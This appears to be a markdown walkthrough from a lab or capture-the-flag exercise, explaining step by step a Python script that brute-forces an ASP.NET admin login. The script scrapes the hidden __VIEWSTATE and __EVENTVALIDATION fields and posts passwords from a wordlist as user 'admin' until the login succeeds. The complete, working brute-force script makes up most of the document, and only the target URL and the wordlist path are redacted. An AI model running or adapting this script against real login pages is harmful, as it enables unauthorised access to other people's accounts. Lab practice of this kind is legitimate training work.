# Automated Script Explanation => No Burp for this one => I will demo on YouTube the entire process 

---

## 1. Importing Libraries
```python
import requests
from bs4 import BeautifulSoup
import logging
```

### Libraries:
- **`requests`**: For making HTTP requests (GET and POST) to the target server.
- **`BeautifulSoup`**: Parses HTML and extracts specific data like hidden fields.
- **`logging`**: Logs messages for monitoring and debugging the script.

---

## 2. Logging Setup
```python
logging.basicConfig(level=logging.INFO)
```
- Configures logging to display messages at the `INFO` level or higher.
- Displays progress messages such as "Fetching the login page..." or "Trying password...".

---

## 3. Fetching the Login Page
```python
url = "http://10.10.12.86/Account/login.aspx?ReturnURL=%2fadmin"
session = requests.Session()

logging.info("Fetching the login page...")
response = session.get(url)
```

### Explanation:
- **`url`**: Target login page URL.
- **`session`**: Maintains cookies and session data across requests.
- **`session.get(url)`**: Fetches the login page, and stores the response.

---

## 4. Parsing the HTML
```python
soup = BeautifulSoup(response.content, 'html.parser')
viewstate = soup.find("input", {"id": "__VIEWSTATE"})['value']
eventvalidation = soup.find("input", {"id": "__EVENTVALIDATION"})['value']
```

### Explanation:
- **`BeautifulSoup`**: Parses the HTML content of the login page.
- **`soup.find`**: Locates hidden fields like:
  - `__VIEWSTATE`: Extracts the `value` attribute.
  - `__EVENTVALIDATION`: Retrieves the value required for the POST request.

---

## 5. Reading the Password Wordlist
- Will write the script on YouTube

```
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import logging

logging.basicConfig(level=logging.INFO)

# Target URL
url = "redacted"
session = requests.Session()

logging.info("Fetching the login page...")
response = session.get(url)
soup = BeautifulSoup(response.content, 'html.parser')

# Extract hidden fields
viewstate = soup.find("input", {"id": "__VIEWSTATE"})['value']
eventvalidation = soup.find("input", {"id": "__EVENTVALIDATION"})['value']

# Wordlist from SecLists
wordlist_file = "redacted"

try:
    with open(wordlist_file, "r") as f:
        passwords = f.readlines()
except FileNotFoundError:
    logging.error("Wordlist file not found.")
    exit()

# Brute-forcing
username = "admin"
for password in passwords:
    password = password.strip()
    logging.info(f"Trying password: {password}")

    payload = {
        "__VIEWSTATE": viewstate,
        "__EVENTVALIDATION": eventvalidation,
        "ctl00$MainContent$LoginUser$UserName": username,
        "ctl00$MainContent$LoginUser$Password": password,
        "ctl00$MainContent$LoginUser$LoginButton": "Log in"
    }

    login_response = session.post(url, data=payload)
    if "Invalid login" not in login_response.text:
        logging.info(f"Login successful! Username: {username}, Password: {password}")
        print(f"Correct password: {password}")
        break
else:
    logging.info("Password not found in the wordlist.")

